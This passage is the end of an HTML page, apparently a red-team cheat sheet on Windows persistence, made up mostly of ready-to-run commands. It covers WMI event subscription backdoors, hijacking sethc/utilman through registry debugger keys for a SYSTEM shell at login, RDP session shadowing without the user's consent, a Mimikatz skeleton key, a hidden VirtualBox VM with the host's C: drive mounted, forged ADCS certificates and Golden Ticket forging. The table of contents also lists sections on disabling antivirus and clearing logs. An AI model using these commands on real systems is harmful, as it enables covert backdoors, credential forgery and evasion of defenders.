+</span></span><span style="display:flex;"><span>$FilterArgs = @{name=<span style="color:#e6db74">&#39;WMIPersist&#39;</span>; EventNameSpace=<span style="color:#e6db74">&#39;root\CimV2&#39;</span>; QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>; Query=<span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 60 AND TargetInstance.SystemUpTime &lt; 90&#34;</span>};
+</span></span><span style="display:flex;"><span>$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
+</span></span><span style="display:flex;"><span>$ConsumerArgs = @{name=<span style="color:#e6db74">&#39;WMIPersist&#39;</span>; CommandLineTemplate=<span style="color:#e6db74">&#34;</span>$($Env:SystemRoot)<span style="color:#e6db74">\System32\binary.exe&#34;</span>;}
+</span></span><span style="display:flex;"><span>$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+</span></span><span style="display:flex;"><span>$FilterToConsumerArgs = @{<span style="color:#66d9ef">Filter</span> = [<span style="color:#66d9ef">Ref</span>] $Filter; Consumer = [<span style="color:#66d9ef">Ref</span>] $Consumer;}
+</span></span><span style="display:flex;"><span>$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Powershell (remove)</span>
+</span></span><span style="display:flex;"><span>$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter <span style="color:#e6db74">&#34;Name = &#39;WMIPersist&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter <span style="color:#e6db74">&#34;Name = &#39;WMIPersist&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query <span style="color:#e6db74">&#34;REFERENCES OF {</span>$($EventConsumerToCleanup.__RELPATH)<span style="color:#e6db74">} WHERE ResultClass = __FilterToConsumerBinding&#34;</span>
+</span></span><span style="display:flex;"><span>$FilterConsumerBindingToCleanup | Remove-WmiObject
+</span></span><span style="display:flex;"><span>$EventConsumerToCleanup | Remove-WmiObject
+</span></span><span style="display:flex;"><span>$EventFilterToCleanup | Remove-WmiObject
+</span></span></code></pre></div><h3 id="binary-replacement">
+  Binary Replacement
+  <a class="anchor" href="#binary-replacement">#</a>
+</h3>
+<h4 id="binary-replacement-on-windows-xp">
+  Binary Replacement on Windows XP+
+  <a class="anchor" href="#binary-replacement-on-windows-xp">#</a>
+</h4>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Executable</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Sticky Keys</td>
+<td>C:\Windows\System32\sethc.exe</td>
+</tr>
+<tr>
+<td>Accessibility Menu</td>
+<td>C:\Windows\System32\utilman.exe</td>
+</tr>
+<tr>
+<td>On-Screen Keyboard</td>
+<td>C:\Windows\System32\osk.exe</td>
+</tr>
+<tr>
+<td>Magnifier</td>
+<td>C:\Windows\System32\Magnify.exe</td>
+</tr>
+<tr>
+<td>Narrator</td>
+<td>C:\Windows\System32\Narrator.exe</td>
+</tr>
+<tr>
+<td>Display Switcher</td>
+<td>C:\Windows\System32\DisplaySwitch.exe</td>
+</tr>
+<tr>
+<td>App Switcher</td>
+<td>C:\Windows\System32\AtBroker.exe</td>
+</tr>
+</tbody>
+</table>
+<p>In Metasploit : <code>use post/windows/manage/sticky_keys</code></p>
+<h4 id="binary-replacement-on-windows-10">
+  Binary Replacement on Windows 10+
+  <a class="anchor" href="#binary-replacement-on-windows-10">#</a>
+</h4>
+<p>Exploit a DLL hijacking vulnerability in the On-Screen Keyboard <strong>osk.exe</strong> executable.</p>
+<p>Create a malicious <strong>HID.dll</strong> in  <code>C:\Program Files\Common Files\microsoft shared\ink\HID.dll</code>.</p>
+<h3 id="rdp-backdoor">
+  RDP Backdoor
+  <a class="anchor" href="#rdp-backdoor">#</a>
+</h3>
+<h4 id="utilmanexe">
+  utilman.exe
+  <a class="anchor" href="#utilmanexe">#</a>
+</h4>
+<p>At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>REG ADD <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&#34;</span> /t REG_SZ /v Debugger /d <span style="color:#e6db74">&#34;C:\windows\system32\cmd.exe&#34;</span> /f
+</span></span></code></pre></div><h4 id="sethcexe">
+  sethc.exe
+  <a class="anchor" href="#sethcexe">#</a>
+</h4>
+<p>Hit F5 a bunch of times when you are at the RDP login screen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>REG ADD <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34;</span> /t REG_SZ /v Debugger /d <span style="color:#e6db74">&#34;C:\windows\system32\cmd.exe&#34;</span> /f
+</span></span></code></pre></div><h3 id="remote-desktop-services-shadowing">
+  Remote Desktop Services Shadowing
+  <a class="anchor" href="#remote-desktop-services-shadowing">#</a>
+</h3>
+<p>:warning: FreeRDP and rdesktop don&rsquo;t support Remote Desktop Services Shadowing feature.</p>
+<p>Requirements:</p>
+<ul>
+<li>RDP must be running</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&#34;</span> /v Shadow /t REG_DWORD /d <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4 – View Session without user’s permission.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allowing remote connections to this computer</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">0</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disable UAC remote restriction</span>
+</span></span><span style="display:flex;"><span>reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span style="color:#ae81ff">1</span> /f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mstsc /v:{ADDRESS} /shadow<span style="color:#960050;background-color:#1e0010">:</span>{SESSION_ID} /noconsentprompt /prompt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee’s session ID;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /noconsentprompt parameter allows to bypass a shadowee’s permission and shadow their session without their consent;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /prompt parameter is used to specify a user’s credentials to connect to a remote host.</span>
+</span></span></code></pre></div><h3 id="skeleton-key">
+  Skeleton Key
+  <a class="anchor" href="#skeleton-key">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Exploitation Command runned as DA:</span>
+</span></span><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;privilege::debug&#34; &#34;misc::skeleton&#34;&#39;</span> -ComputerName &lt;DCs FQDN&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Access using the password &#34;mimikatz&#34;</span>
+</span></span><span style="display:flex;"><span>Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator
+</span></span></code></pre></div><h3 id="virtual-machines">
+  Virtual Machines
+  <a class="anchor" href="#virtual-machines">#</a>
+</h3>
+<blockquote>
+<p>Based on the Shadow Bunny technique.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># download virtualbox</span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest <span style="color:#e6db74">&#34;https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe&#34;</span> -OutFile $env:TEMP\VirtualBox-<span style="color:#ae81ff">6.1</span>.<span style="color:#ae81ff">8</span>-<span style="color:#ae81ff">137981</span>-Win.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># perform a silent install and avoid creating desktop and quick launch icons</span>
+</span></span><span style="display:flex;"><span>VirtualBox-<span style="color:#ae81ff">6.0</span>.<span style="color:#ae81ff">14</span>-<span style="color:#ae81ff">133895</span>-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=<span style="color:#ae81ff">0</span>,VBOX_INSTALLQUICKLAUNCHSHORTCUT=<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># in \Program Files\Oracle\VirtualBox\VBoxManage.exe</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disabling notifications</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe setextradata global GUI/SuppressMessages <span style="color:#e6db74">&#34;all&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download the Virtual machine disk</span>
+</span></span><span style="display:flex;"><span>Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a new VM</span>
+</span></span><span style="display:flex;"><span>$vmname = <span style="color:#e6db74">&#34;IT Recovery&#34;</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe createvm --name $vmname --ostype <span style="color:#e6db74">&#34;Ubuntu&#34;</span> --register
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add a network card in NAT mode</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --ioapic on  <span style="color:#75715e"># required for 64bit</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --memory <span style="color:#ae81ff">1024</span> --vram <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --nic1 nat
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --audio none
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe modifyvm $vmname --description <span style="color:#e6db74">&#34;Shadowbunny&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mount the VHD file</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe storagectl $vmname -name <span style="color:#e6db74">&#34;SATA Controller&#34;</span> -add sata
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe storageattach $vmname -comment <span style="color:#e6db74">&#34;Shadowbunny Disk&#34;</span> -storagectl <span style="color:#e6db74">&#34;SATA Controller&#34;</span> -type hdd -medium <span style="color:#e6db74">&#34;</span>$env:USERPROFILE<span style="color:#e6db74">\VirtualBox VMs\IT Recovery\shadowbunny.vhd&#34;</span> -port <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the VM</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe startvm $vmname <span style="color:#960050;background-color:#1e0010">–</span>type headless 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># optional - adding a shared folder</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># require: VirtualBox Guest Additions</span>
+</span></span><span style="display:flex;"><span>.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># then mount the folder in the VM</span>
+</span></span><span style="display:flex;"><span>sudo mkdir /mnt/c
+</span></span><span style="display:flex;"><span>sudo mount -t vboxsf shadow_c /mnt/c
+</span></span></code></pre></div><h2 id="domain">
+  Domain
+  <a class="anchor" href="#domain">#</a>
+</h2>
+<h3 id="user-certificate">
+  User Certificate
+  <a class="anchor" href="#user-certificate">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Request a certificate for the User template</span>
+</span></span><span style="display:flex;"><span>.\Certify.exe request /ca<span style="color:#960050;background-color:#1e0010">:</span>CA01.megacorp.local\CA01 /template<span style="color:#960050;background-color:#1e0010">:</span>User
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert the certificate for Rubeus</span>
+</span></span><span style="display:flex;"><span>openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Request a TGT using the certificate</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>username /certificate<span style="color:#960050;background-color:#1e0010">:</span>C:\Temp\cert.pfx /password<span style="color:#960050;background-color:#1e0010">:</span>Passw0rd123!
+</span></span></code></pre></div><h3 id="golden-certificate">
+  Golden Certificate
+  <a class="anchor" href="#golden-certificate">#</a>
+</h3>
+<blockquote>
+<p>Require elevated privileges in the Active Directory, or on the ADCS machine</p>
+</blockquote>
+<ul>
+<li>Export CA as p12 file: <code>certsrv.msc</code> &gt; <code>Right Click</code> &gt; <code>Back up CA...</code></li>
+<li>Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>privilege::debug
+</span></span><span style="display:flex;"><span>crypto::capi
+</span></span><span style="display:flex;"><span>crypto::cng
+</span></span><span style="display:flex;"><span>crypto::certificates /systemstore<span style="color:#960050;background-color:#1e0010">:</span>local_machine /store<span style="color:#960050;background-color:#1e0010">:</span>my /export
+</span></span></code></pre></div></li>
+<li>Alternative 2: Using SharpDPAPI, then convert the certificate: <code>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</code></li>
+<li>
+  <a href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> - Forge a certificate for any active domain user using the CA certificate
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
+</span></span><span style="display:flex;"><span>ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
+</span></span></code></pre></div></li>
+<li>Finally you can request a TGT using the Certificate
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>ron /certificate<span style="color:#960050;background-color:#1e0010">:</span>harry.pfx /password<span style="color:#960050;background-color:#1e0010">:</span>Password123
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="golden-ticket">
+  Golden Ticket
+  <a class="anchor" href="#golden-ticket">#</a>
+</h3>
+<blockquote>
+<p>Forge a Golden ticket using Mimikatz</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>kerberos::purge
+</span></span><span style="display:flex;"><span>kerberos::golden /user<span style="color:#960050;background-color:#1e0010">:</span>evil /domain<span style="color:#960050;background-color:#1e0010">:</span>pentestlab.local /sid<span style="color:#960050;background-color:#1e0010">:</span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3737340914</span>-<span style="color:#ae81ff">2019594255</span>-<span style="color:#ae81ff">2413685307</span> /krbtgt<span style="color:#960050;background-color:#1e0010">:</span>d125e4f69c851529045ec95ca80fa37e /ticket<span style="color:#960050;background-color:#1e0010">:</span>evil.tck /ptt
+</span></span><span style="display:flex;"><span>kerberos::tgt
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://rastamouse.me/2018/03/a-view-of-persistence/">A view of persistence - Rastamouse</a></li>
+<li>
+  <a href="http://pwnwiki.io/#!persistence/windows/index.md">Windows Persistence Commands - Pwn Wiki</a></li>
+<li>
+  <a href="http://www.youtube.com/watch?v=K7o9RSVyazo">SharPersist Windows Persistence Toolkit in C - Brett Hawkins</a></li>
+<li>
+  <a href="https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/">IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020</a></li>
+<li>
+  <a href="https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html">Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa</a></li>
+<li>
+  <a href="https://github.com/netbiosX/Checklists/blob/master/Persistence.md">Persistence - Checklist - @netbiosX</a></li>
+<li>
+  <a href="https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/">Persistence – Winlogon Helper DLL - @netbiosX</a></li>
+<li>
+  <a href="https://pentestlab.blog/2019/10/30/persistence-bits-jobs/">Persistence - BITS Jobs - @netbiosX</a></li>
+<li>
+  <a href="https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/">Persistence – Image File Execution Options Injection - @netbiosX</a></li>
+<li>
+  <a href="https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/">Persistence – Registry Run Keys - @netbiosX</a></li>
+<li>
+  <a href="https://pentestlab.blog/2021/11/15/golden-certificate/">Golden Certificate - NOVEMBER 15, 2021</a></li>
+<li>
+  <a href="https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi</a></li>
+<li>
+  <a href="https://binary.blog/2020/01/21/persistence-wmi-event-subscription/">Persistence – WMI Event Subscription - JANUARY 21, 2020 - pentestlab</a></li>
+<li>
+  <a href="https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html">Persistence via WMI Event Subscription - Elastic Security Solution</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/windows_persistence.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows---persistence">Windows - Persistence</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#hide-your-binary">Hide Your Binary</a></li>
+        <li><a href="#disable-antivirus-and-security">Disable Antivirus and Security</a>
+          <ul>
+            <li><a href="#antivirus-removal">Antivirus Removal</a></li>
+            <li><a href="#disable-windows-defender">Disable Windows Defender</a></li>
+            <li><a href="#disable-windows-firewall">Disable Windows Firewall</a></li>
+            <li><a href="#clear-system-and-security-logs">Clear System and Security Logs</a></li>
+          </ul>
+        </li>
+        <li><a href="#simple-user">Simple User</a>
+          <ul>
+            <li><a href="#registry-hkcu">Registry HKCU</a></li>
+            <li><a href="#startup">Startup</a></li>
+            <li><a href="#scheduled-tasks-user">Scheduled Tasks User</a></li>
+            <li><a href="#bits-jobs">BITS Jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#serviceland">Serviceland</a>
+          <ul>
+            <li><a href="#iis">IIS</a></li>
+            <li><a href="#windows-service">Windows Service</a></li>
+          </ul>
+        </li>
+        <li><a href="#elevated">Elevated</a>
+          <ul>
+            <li><a href="#registry-hklm">Registry HKLM</a></li>
+            <li><a href="#startup-elevated">Startup Elevated</a></li>
+            <li><a href="#services-elevated">Services Elevated</a></li>
+            <li><a href="#scheduled-tasks-elevated">Scheduled Tasks Elevated</a></li>
+            <li><a href="#windows-management-instrumentation-event-subscription">Windows Management Instrumentation Event Subscription</a></li>
+            <li><a href="#binary-replacement">Binary Replacement</a></li>
+            <li><a href="#rdp-backdoor">RDP Backdoor</a></li>
+            <li><a href="#remote-desktop-services-shadowing">Remote Desktop Services Shadowing</a></li>
+            <li><a href="#skeleton-key">Skeleton Key</a></li>
+            <li><a href="#virtual-machines">Virtual Machines</a></li>
+          </ul>
+        </li>
+        <li><a href="#domain">Domain</a>
+          <ul>
+            <li><a href="#user-certificate">User Certificate</a></li>
+            <li><a href="#golden-certificate">Golden Certificate</a></li>
+            <li><a href="#golden-ticket">Golden Ticket</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
